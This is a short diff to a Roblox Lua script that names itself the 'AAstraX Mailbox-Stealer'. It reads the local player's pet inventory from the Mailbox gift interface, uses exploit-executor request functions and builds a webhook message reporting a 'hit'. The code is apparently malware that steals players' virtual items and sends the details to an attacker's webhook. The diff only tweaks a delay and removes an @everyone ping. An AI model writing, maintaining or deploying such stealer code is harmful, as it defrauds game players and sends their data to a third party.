@@ -1,4 +1,4 @@
-wait(0.8)
+wait(1)
 local Exclusive = 0
 
 for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
@@ -45,7 +45,7 @@ request = http_request or request or HttpPost or syn.request
 
 local data1 = {
 
-    ["content"] = "||@everyone||\n**:comet:AAstraX Mailbox-Stealer Detected A Hit:comet:**", -- Free Webhook logging
+    ["content"] = "\n**:comet:AAstraX Mailbox-Stealer Detected A Hit:comet:**", -- Free Webhook logging
 
     ["embeds"] = {
 
